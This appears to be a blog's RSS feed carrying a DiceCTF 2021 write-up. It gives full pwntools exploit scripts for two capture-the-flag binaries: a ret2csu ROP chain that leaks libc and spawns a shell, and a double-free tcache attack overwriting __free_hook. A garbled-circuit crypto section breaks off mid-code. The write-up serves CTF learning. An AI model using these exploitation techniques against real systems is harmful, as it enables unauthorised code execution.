<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Anemone&#39;s Blog</title>
        <link>https://vergissmeinnichtz.github.io/posts/</link>
        <description>Recent content in Posts on Anemone&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 08 Feb 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://vergissmeinnichtz.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>2021DiceCTF-WriteUp</title>
            <link>https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/</link>
            <pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate>
            
            <guid>https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/</guid>
            <description>Introduction This is a small write up and recurrence for 2021DiceCTF.
Pwn babyrop Analysis Just a stack overflow and use csu to solve it. Notice that some registers are different for csu.
Exp from pwn import * context.log_level = &amp;#34;debug&amp;#34; context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;splitw&amp;#39;, &amp;#39;-h&amp;#39;] LOCAL = 0 DEBUG = 0 if LOCAL: r = process(&amp;#34;./babyrop&amp;#34;) libc = ELF(&amp;#34;/lib/x86_64-linux-gnu/libc.so.6&amp;#34;) write_offset = libc.sym[&amp;#34;write&amp;#34;] system_offset = libc.sym[&amp;#34;execve&amp;#34;] else: r = remote(&amp;#34;dicec.tf&amp;#34;,31924) write_offset = 0x1111d0 system_offset = 0xe62f0 if DEBUG: gdb.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>This is a small write up and recurrence for 2021DiceCTF.</p>
<h2 id="pwn">Pwn</h2>
<h3 id="babyrop">babyrop</h3>
<h4 id="analysis">Analysis</h4>
<p>Just a stack overflow and use csu to solve it. Notice that some registers are different for <a href="https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/#ret2csu">csu</a>.</p>
<h4 id="exp">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]

LOCAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
DEBUG <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">if</span> LOCAL:
    r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./babyrop&#34;</span>)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
    write_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>]
    system_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;execve&#34;</span>]
<span style="color:#66d9ef">else</span>:
    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dicec.tf&#34;</span>,<span style="color:#ae81ff">31924</span>)   
    write_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1111d0</span> 
    system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe62f0</span>

<span style="color:#66d9ef">if</span> DEBUG:
    gdb<span style="color:#f92672">.</span>attach(r,<span style="color:#e6db74">&#34;b *0x40116B&#34;</span>)

elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./babyrop&#39;</span>)
main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401136</span>
write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;write&#39;</span>]
gets_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
csu_front_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011B0</span>
csu_end_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011CA</span>
bss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404038</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">csu</span>(rbx, rbp, r12, r13, r14, r15, last, offset):
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> offset <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>
    payload <span style="color:#f92672">+=</span> p64(csu_end_addr) <span style="color:#f92672">+</span> p64(rbx) <span style="color:#f92672">+</span> p64(rbp) <span style="color:#f92672">+</span> p64(r12) <span style="color:#f92672">+</span> p64(r13) <span style="color:#f92672">+</span> p64(r14) <span style="color:#f92672">+</span> p64(r15)
    payload <span style="color:#f92672">+=</span> p64(csu_front_addr)
    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x38</span>
    payload <span style="color:#f92672">+=</span> p64(last)
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your name: &#34;</span>)
    r<span style="color:#f92672">.</span>sendline(payload)
    sleep(<span style="color:#ae81ff">1</span>)

csu(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,write_got,<span style="color:#ae81ff">8</span>,write_got,main_addr,<span style="color:#ae81ff">0x40</span>)
write_addr <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
success(<span style="color:#e6db74">&#34;write_addr: &#34;</span> <span style="color:#f92672">+</span> hex(write_addr))
libc_base <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> write_offset 
success(<span style="color:#e6db74">&#34;libc_base: &#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> system_offset
csu(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,bss <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>,gets_got,main_addr,<span style="color:#ae81ff">0x40</span>)
r<span style="color:#f92672">.</span>sendline(p64(system_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
csu(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,bss <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x108</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,bss <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>,main_addr,<span style="color:#ae81ff">0x40</span>)

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="flippidyrecurrence">flippidy(Recurrence)</h3>
<h4 id="analysis-1">Analysis</h4>
<p>This is a no-PIE program.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</code></pre></div><p>The main function asks for the size of note list. (The <code>8 * size</code> can be overflowed, such as <code>0x20010000</code>, and you can write a heap address to libc or ld, but can&rsquo;t leak anything and keep going&hellip;)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
{
  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> choice; <span style="color:#75715e">// [rsp+Ch] [rbp-4h]
</span><span style="color:#75715e"></span>
  setbuf(stdout, <span style="color:#ae81ff">0LL</span>);
  setbuf(stdin, <span style="color:#ae81ff">0LL</span>);
  setbuf(stderr, <span style="color:#ae81ff">0LL</span>);
  welcome();
  printf(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#e6db74">&#34;To get started, first tell us how big your notebook will be: &#34;</span>);
  size <span style="color:#f92672">=</span> read_int();
  chunk_head <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> size);
  memset(chunk_head, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> size);
  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
  {
    menu();
    printf(<span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#ae81ff">0LL</span>);
    choice <span style="color:#f92672">=</span> read_int();
    <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
    {
      puts(<span style="color:#e6db74">&#34;Goodbye!&#34;</span>);
      exit(<span style="color:#ae81ff">0</span>);
    }
    <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span> )
    {
LABEL_11:
      puts(<span style="color:#e6db74">&#34;Invalid choice.&#34;</span>);
    }
    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
    {
      add();
    }
    <span style="color:#66d9ef">else</span>
    {
      <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
        <span style="color:#66d9ef">goto</span> LABEL_11;
      flip();
    }
  }
}
</code></pre></div><p>Choice 1 can add a 0x30 chunk.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span>()
{
  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>v1; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> idx; <span style="color:#75715e">// [rsp+Ch] [rbp-14h]
</span><span style="color:#75715e"></span>
  printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
  idx <span style="color:#f92672">=</span> read_int();
  <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> size )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;Invalid index.&#34;</span>);
  v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> idx);
  <span style="color:#f92672">*</span>v1 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30uLL</span>);
  printf(<span style="color:#e6db74">&#34;Content: &#34;</span>);
  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)fgets(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> idx), <span style="color:#ae81ff">0x30</span>, stdin);
}
</code></pre></div><p>Choice 2 can flip the note list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">flip</span>()
{
  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>v0; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>v1; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> flag1; <span style="color:#75715e">// [rsp+Ah] [rbp-A6h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> flag2; <span style="color:#75715e">// [rsp+Bh] [rbp-A5h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+Ch] [rbp-A4h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> src; <span style="color:#75715e">// [rsp+10h] [rbp-A0h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> dst; <span style="color:#75715e">// [rsp+50h] [rbp-60h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+98h] [rbp-18h]
</span><span style="color:#75715e"></span>
  v8 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> size <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; <span style="color:#f92672">++</span>i )
  {
    memset(<span style="color:#f92672">&amp;</span>src, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40uLL</span>);
    memset(<span style="color:#f92672">&amp;</span>dst, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40uLL</span>);
    flag1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    flag2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> i) )
    {
      strcpy(<span style="color:#f92672">&amp;</span>src, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> i));
      free(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> i));
    }
    <span style="color:#66d9ef">else</span>
    {
      flag1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    }
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) )
    {
      strcpy(<span style="color:#f92672">&amp;</span>dst, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
      free(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
    }
    <span style="color:#66d9ef">else</span>
    {
      flag2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    }
    <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    <span style="color:#66d9ef">if</span> ( flag1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
    {
      <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    }
    <span style="color:#66d9ef">else</span>
    {
      v0 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> (size <span style="color:#f92672">-</span> i) <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>);
      <span style="color:#f92672">*</span>v0 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30uLL</span>);
      strcpy(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#f92672">&amp;</span>src);
    }
    <span style="color:#66d9ef">if</span> ( flag2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
    {
      <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    }
    <span style="color:#66d9ef">else</span>
    {
      v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> i);
      <span style="color:#f92672">*</span>v1 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30uLL</span>);
      strcpy(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> i), <span style="color:#f92672">&amp;</span>dst);
    }
  }
  <span style="color:#66d9ef">return</span> v8 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
}
</code></pre></div><p>If we set size as <code>1</code>, and add a chunk. Then when we flip the note list, there will have a <code>double free</code>. We can use <code>menu</code> to leak libc because it use some pointers to show menu.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">menu</span>()
{
  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+Ch] [rbp-4h]
</span><span style="color:#75715e"></span>
  result <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>i )
    result <span style="color:#f92672">=</span> puts(menu_str[i]);
  <span style="color:#66d9ef">return</span> result;
}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">.data:<span style="color:#ae81ff">0000000000404020</span> menu_str        dq offset aMenu         ; DATA XREF: menu<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>A<span style="color:#960050;background-color:#1e0010">↑</span>o
.data:<span style="color:#ae81ff">0000000000404020</span>                                         ; <span style="color:#e6db74">&#34;----- Menu -----&#34;</span>
.data:<span style="color:#ae81ff">000000000040402</span><span style="color:#ae81ff">8</span>                 dq offset a1AddToYourNote ; <span style="color:#e6db74">&#34;1. Add to your notebook&#34;</span>
.data:<span style="color:#ae81ff">0000000000404030</span>                 dq offset a2FlipYourNoteb ; <span style="color:#e6db74">&#34;2. Flip your notebook!&#34;</span>
.data:<span style="color:#ae81ff">000000000040403</span><span style="color:#ae81ff">8</span>                 dq offset a3Exit        ; <span style="color:#e6db74">&#34;3. Exit&#34;</span>
.data:<span style="color:#ae81ff">0000000000404040</span> aMenu           db <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">-----</span> Menu <span style="color:#f92672">-----</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">0</span> ; DATA XREF: .data:menu_str<span style="color:#960050;background-color:#1e0010">↑</span>o
.data:<span style="color:#ae81ff">0000000000404051</span>                 db    <span style="color:#ae81ff">0</span>
</code></pre></div><p>When we have <code>libc base</code>, we can write <code>one gadget</code> to <code>free_hook</code> and getshell.</p>
<h4 id="exp-1">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]

DEBUG <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./flippidy&#34;</span>)
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./flippidy&#34;</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;</span>)
menu_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]
chunk_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404158</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd</span>(idx):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;: &#34;</span>,str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx,content):
    cmd(<span style="color:#ae81ff">1</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(idx))
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Content: &#34;</span>,content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flip</span>():
    cmd(<span style="color:#ae81ff">2</span>)

<span style="color:#66d9ef">if</span> DEBUG:
    gdb<span style="color:#f92672">.</span>attach(r,<span style="color:#e6db74">&#34;b *0x401749&#34;</span>)

size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;To get started, first tell us how big your notebook will be:&#34;</span>)
r<span style="color:#f92672">.</span>sendline(str(size))

add(<span style="color:#ae81ff">0</span>,p64(menu_addr))
flip() <span style="color:#75715e"># double free</span>
payload <span style="color:#f92672">=</span> p64(puts_got) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
payload <span style="color:#f92672">+=</span> p64(chunk_list)
add(<span style="color:#ae81ff">0</span>,payload)
r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a\x0a</span><span style="color:#e6db74">&#34;</span>)
libc_base <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
success(<span style="color:#e6db74">&#34;libc_base : &#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]
success(<span style="color:#e6db74">&#34;free_hook : &#34;</span> <span style="color:#f92672">+</span> hex(free_hook))
one_gadget <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f3c2</span>
success(<span style="color:#e6db74">&#34;one_gadget : &#34;</span> <span style="color:#f92672">+</span> hex(one_gadget))

<span style="color:#75715e"># 0x404040 -&gt; 0x404158 -&gt; 0x59f260 -&gt; 0x404020 -&gt; puts_got -&gt; ...</span>
add(<span style="color:#ae81ff">0</span>,p64(<span style="color:#ae81ff">0xdeadbeef</span>))

<span style="color:#75715e"># 0x404158 -&gt; 0x59f260 -&gt; 0x404040 -&gt; 0xdeadbeef</span>
add(<span style="color:#ae81ff">0</span>,p64(free_hook))

<span style="color:#75715e"># 0x59f260 -&gt; 0x404158 -&gt; free_hook</span>
add(<span style="color:#ae81ff">0</span>,p64(<span style="color:#ae81ff">0xdeadbeef</span>))

<span style="color:#75715e"># 0x404158 -&gt; free_hook -&gt; 0x59f260 -&gt; 0xdeadbeef</span>
add(<span style="color:#ae81ff">0</span>,p64(free_hook))

<span style="color:#75715e"># free_hook -&gt; 0x404158 -&gt; free_hook -&gt; ...</span>
add(<span style="color:#ae81ff">0</span>,p64(one_gadget))

flip() <span style="color:#75715e"># get shell</span>

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="garbledrecurrence">garbled(Recurrence)</h3>
<h4 id="analysis-2">Analysis</h4>
<p>This is a <code>Garbled Circuit</code> challenge. We should recover the <code>inputs</code> to get flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># obtain_flag.py</span>
<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">once you&#39;ve found the input labels which make the circuit return `true`,
</span><span style="color:#e6db74">then concatenate them together, hash them,
</span><span style="color:#e6db74">and xor with the provided string to obtain the flag
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">import</span> json

<span style="color:#f92672">from</span> yao <span style="color:#f92672">import</span> evaluate_circuit
<span style="color:#f92672">from</span> public_data <span style="color:#f92672">import</span> g_tables
<span style="color:#f92672">from</span> private_data <span style="color:#f92672">import</span> keys, flag


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(A, B):
    <span style="color:#66d9ef">return</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B))


<span style="color:#75715e">##########################################################</span>


circuit_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;circuit.json&#34;</span>
<span style="color:#66d9ef">with</span> open(circuit_filename) <span style="color:#66d9ef">as</span> json_file:
    circuit <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(json_file)
    

<span style="color:#75715e"># ?????????????????</span>
inputs <span style="color:#f92672">=</span> {
 <span style="color:#ae81ff">1</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>,
 <span style="color:#ae81ff">2</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>,
 <span style="color:#ae81ff">3</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>,
 <span style="color:#ae81ff">4</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>
}


evaluation <span style="color:#f92672">=</span> evaluate_circuit(circuit, g_tables, inputs)

<span style="color:#75715e"># circuit should return `true`</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> circuit[<span style="color:#e6db74">&#39;outputs&#39;</span>]:
    <span style="color:#66d9ef">assert</span> evaluation[i] <span style="color:#f92672">==</span> keys[i][<span style="color:#ae81ff">1</span>]


<span style="color:#75715e">##########################################################</span>


msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}:{}:{}:{}&#34;</span><span style="color:#f92672">.</span>format(inputs[<span style="color:#ae81ff">1</span>], inputs[<span style="color:#ae81ff">2</span>], inputs[<span style="color:#ae81ff">3</span>], inputs[<span style="color:#ae81ff">4</span>])
msg <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>)

m <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha512()
